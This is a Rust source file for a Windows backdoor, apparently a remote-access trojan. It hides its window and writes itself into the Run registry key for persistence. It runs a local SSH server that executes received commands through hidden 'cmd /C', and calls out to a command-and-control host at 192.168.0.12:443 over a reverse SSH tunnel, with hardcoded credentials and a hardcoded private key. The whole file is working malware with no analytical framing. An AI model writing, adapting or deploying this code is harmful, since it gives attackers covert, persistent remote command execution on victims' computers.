#![windows_subsystem = "windows"]
extern crate futures;
extern crate thrussh;
extern crate thrussh_keys;
extern crate tokio;
use futures::Future;
use log::{debug, error, info, warn};
use std::collections::HashMap;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::sync::{Arc, Mutex};
use thrussh::server::{Auth, Session};
use thrussh::*;
use thrussh_keys::*;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::Duration;

#[tokio::main]
async fn main() {
    // TODO don't add if exists already
    Command::new("reg.exe")
        .arg("add")
        .arg("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
        .arg("/v")
        .arg("Coucou")
        .arg("/t")
        .arg("REG_SZ")
        .arg("/d")
        .arg(std::env::current_exe().unwrap())
        .creation_flags(0x08000000)
        .output()
        .unwrap();

    let client_key = thrussh_keys::key::KeyPair::generate_ed25519().unwrap();
    let client_pubkey = Arc::new(client_key.clone_public_key());
    let mut config = thrussh::server::Config::default();
    config.connection_timeout = Some(std::time::Duration::from_secs(50));
    config.auth_rejection_time = std::time::Duration::from_secs(1);
    let server_key = thrussh_keys::key::KeyPair::generate_ed25519().unwrap();
    let key_bytes: [u8; 64] = [
        104, 47, 26, 84, 245, 75, 218, 126, 11, 60, 195, 252, 244, 206, 122, 237, 104, 92, 127,
        126, 36, 39, 178, 188, 96, 58, 177, 19, 32, 213, 99, 122, 50, 142, 172, 103, 39, 219, 182,
        165, 60, 136, 32, 99, 172, 13, 253, 73, 198, 127, 39, 153, 196, 183, 102, 138, 253, 229,
        216, 71, 13, 240, 173, 26,
    ];
    let key = thrussh_keys::key::KeyPair::Ed25519(thrussh_keys::key::ed25519::SecretKey {
        key: key_bytes,
    });
    config.keys.push(key);
    let config = Arc::new(config);
    let sh = Server {
        client_pubkey,
        clients: Arc::new(Mutex::new(HashMap::new())),
        id: 0,
    };
    tokio::spawn(client_main());
    thrussh::server::run(config, "localhost:45535", sh)
        .await
        .unwrap();
}

#[derive(Clone)]
struct Server {
    client_pubkey: Arc<thrussh_keys::key::PublicKey>,
    clients: Arc<Mutex<HashMap<(usize, ChannelId), thrussh::server::Handle>>>,
    id: usize,
}

impl server::Server for Server {
    type Handler = Self;
    // TODO recycle IDs
    fn new(&mut self, _: Option<std::net::SocketAddr>) -> Self {
        let s = self.clone();
        self.id += 1;
        s
    }
}

impl server::Handler for Server {
    type FutureAuth = futures::future::Ready<Result<(Self, server::Auth), anyhow::Error>>;
    type FutureUnit = futures::future::Ready<Result<(Self, Session), anyhow::Error>>;
    type FutureBool = futures::future::Ready<Result<(Self, Session, bool), anyhow::Error>>;

    fn finished_auth(mut self, auth: Auth) -> Self::FutureAuth {
        futures::future::ready(Ok((self, auth)))
    }
    fn finished_bool(self, b: bool, s: Session) -> Self::FutureBool {
        futures::future::ready(Ok((self, s, b)))
    }
    fn finished(self, s: Session) -> Self::FutureUnit {
        futures::future::ready(Ok((self, s)))
    }
    fn channel_open_session(self, channel: ChannelId, session: Session) -> Self::FutureUnit {
        {
            let mut clients = self.clients.lock().unwrap();
            clients.insert((self.id, channel), session.handle());
        }
        self.finished(session)
    }
    fn shell_request(self, channel: ChannelId, session: Session) -> Self::FutureUnit {
        println!("shell requested");
        self.finished(session)
    }
    fn auth_password(self, user: &str, password: &str) -> Self::FutureAuth {
        if user == "random" && password == "random" {
            self.finished_auth(server::Auth::Accept)
        } else {
            self.finished_auth(server::Auth::Reject)
        }
    }
    fn subsystem_request(
        self,
        channel: ChannelId,
        name: &str,
        session: Session,
    ) -> Self::FutureUnit {
        println!("System requested");
        self.finished(session)
    }
    fn exec_request(
        self,
        channel: ChannelId,
        data: &[u8],
        mut session: Session,
    ) -> Self::FutureUnit {
        {
            let output = Command::new("cmd")
                .arg("/C")
                .arg(std::str::from_utf8(data).unwrap())
                .creation_flags(0x08000000)
                .output()
                .unwrap()
                .stdout;
            session.data(channel, CryptoVec::from_slice(&output));
        }
        session.close(channel);
        self.finished(session)
    }
    fn data(self, channel: ChannelId, data: &[u8], mut session: Session) -> Self::FutureUnit {
        //{
        //    let mut clients = self.clients.lock().unwrap();
        //    for ((id, channel), ref mut s) in clients.iter_mut() {
        //        if *id != self.id {
        //            s.data(*channel, CryptoVec::from_slice(data));
        //        }
        //    }
        //}
        //println!("{:?}", data);
        //session.data(channel, CryptoVec::from_slice(data));
        self.finished(session)
    }
}

#[derive(Clone, Copy)]
struct Client {}

impl client::Handler for Client {
    type FutureUnit = futures::future::Ready<Result<(Self, client::Session), anyhow::Error>>;
    type FutureBool = futures::future::Ready<Result<(Self, bool), anyhow::Error>>;

    fn finished_bool(self, b: bool) -> Self::FutureBool {
        futures::future::ready(Ok((self, b)))
    }
    fn finished(self, session: client::Session) -> Self::FutureUnit {
        futures::future::ready(Ok((self, session)))
    }
    fn check_server_key(self, _server_public_key: &key::PublicKey) -> Self::FutureBool {
        self.finished_bool(true)
    }
}

async fn client_main() {
    let config = thrussh::client::Config::default();
    let config = Arc::new(config);
    let sh = Client {};
    env_logger::init();

    loop {
        let config = Arc::clone(&config);
        let mut session = match thrussh::client::connect(config, "192.168.0.12:443", sh).await {
            Ok(s) => s,
            Err(e) => {
                error!("Error while connecting: {}", e);
                std::thread::sleep(Duration::from_millis(500));
                continue;
            }
        };
        // TODO secure this
        debug!("Awaiting session from server...");
        if session
            .authenticate_password("command", "polochon")
            .await
            .unwrap()
        {
            debug!("Awaiting channel opening from server...");
            let mut main_channel = session.channel_open_session().await.unwrap();

            debug!("Awaiting TCP/IP forwarding enabling from server...");
            main_channel
                .tcpip_forward(true, "localhost", 44321)
                .await
                .expect("Could not enable TCP/IP forwarding.");
            loop {
                debug!("Waiting for a forwarding request to come in...");
                let mut forwarding_channel = session.channel_accept_forwarding().await.unwrap();
                let mut stream = match TcpStream::connect("localhost:45535").await {
                    Ok(st) => st,
                    Err(e) => {
                        error!("Could not connect to server: {:?}", e);
                        return;
                    }
                };
                info!("C&C connection established.");
                let mut buf = vec![0; 4096];

                loop {
                    tokio::select! {
                        msg = forwarding_channel.wait() => {
                            debug!("Received message from C&C");
                            match msg {
                                Some(ChannelMsg::Data { data }) => {
                                    stream.write_all(&data).await.unwrap();
                                },
                                Some(ChannelMsg::Eof) => {
                                    info!("C&C disconnected");
                                    break;
                                },
                                m => warn!("Something else was received from the forwarding channel: {:?}", &m),
                            };
                        }
                        msg = stream.read(&mut buf) => {
                            match msg {
                                Ok(0) => (),
                                Ok(n) => {
                                    buf.resize(n, 0);
                                    forwarding_channel.data(&buf).await.unwrap();
                                }
                                Err(e) => {
                                    warn!("{:?} happened when reading from the server.", e);
                                }
                            }
                            buf = vec![0; 4096];
                        }
                    }
                    std::thread::sleep(Duration::from_millis(50));
                }
            }
        } else {
            error!("Authentication error.");
            break;
        }
    }
}
